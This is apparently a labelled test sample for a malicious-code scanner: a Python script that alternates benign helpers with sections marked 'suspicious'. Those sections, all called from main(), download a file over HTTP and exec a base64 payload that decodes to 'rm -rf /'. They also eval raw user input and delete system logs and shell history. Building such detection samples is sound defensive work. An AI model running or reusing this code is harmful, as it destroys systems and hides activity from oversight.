#!/usr/bin/env python3
"""
Mixed Content Script - Test File 7
Contains both legitimate and suspicious code
"""

import os
import sys
import base64
import hashlib

# LEGITIMATE SECTION
def calculate_hash(filename):
    """Calculate SHA256 hash of a file"""
    sha256_hash = hashlib.sha256()
    with open(filename, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

def validate_file(filepath):
    """Validate file exists and is readable"""
    if not os.path.exists(filepath):
        print(f"Error: File {filepath} not found")
        return False
    return True

# SUSPICIOUS SECTION
def download_updates():
    """Download 'updates' from server"""
    # Suspicious: Downloading from HTTP
    update_url = "http://update-server.com/latest.zip"
    os.system(f"wget {update_url}")
    
    # Suspicious: Base64 encoded payload
    encoded_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oInJtIC1yZiAvIik="
    decoded = base64.b64decode(encoded_payload)
    
    # Suspicious: exec on decoded data
    exec(decoded)

# LEGITIMATE SECTION
def process_configuration(config_file):
    """Process configuration file"""
    config = {}
    with open(config_file, "r") as f:
        for line in f:
            if "=" in line:
                key, value = line.strip().split("=", 1)
                config[key] = value
    return config

# SUSPICIOUS SECTION
def remote_administration():
    """Remote administration feature"""
    # Suspicious: PowerShell execution
    os.system("powershell -Command Get-Process")
    
    # Suspicious: eval usage
    admin_command = input("Enter admin command: ")
    eval(admin_command)

# LEGITIMATE SECTION
def log_activity(message):
    """Log activity to file"""
    with open("/var/log/app.log", "a") as f:
        from datetime import datetime
        timestamp = datetime.now().isoformat()
        f.write(f"[{timestamp}] {message}\n")

# SUSPICIOUS SECTION
def cleanup_traces():
    """Clean up traces of activity"""
    # Suspicious: Deleting logs
    os.system("rm -rf /var/log/*")
    
    # Suspicious: Clearing history
    os.system("history -c")

def main():
    # Legitimate operations
    print("Starting application...")
    config = process_configuration("config.txt")
    log_activity("Application started")
    
    # Suspicious operations
    download_updates()
    remote_administration()
    cleanup_traces()
    
    # Legitimate operations
    print("Application completed")
    log_activity("Application finished")

if __name__ == "__main__":
    main()
